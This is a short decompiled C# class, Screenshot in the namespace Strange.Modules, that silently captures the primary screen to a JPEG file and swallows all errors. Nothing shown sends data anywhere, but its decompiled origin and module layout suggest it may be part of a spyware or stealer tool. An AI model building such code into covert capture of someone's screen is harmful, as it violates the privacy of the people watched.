using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace Strange.Modules
{
	// Token: 0x0200000C RID: 12
	internal class Screenshot
	{
		// Token: 0x06000019 RID: 25 RVA: 0x0000269C File Offset: 0x0000089C
		public static void CaptureToFile(string path)
		{
			try
			{
				Rectangle bounds = Screen.AllScreens[0].Bounds;
				Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
				Graphics.FromImage(bitmap).CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
				bitmap.Save(path, ImageFormat.Jpeg);
			}
			catch
			{
			}
		}
	}
}
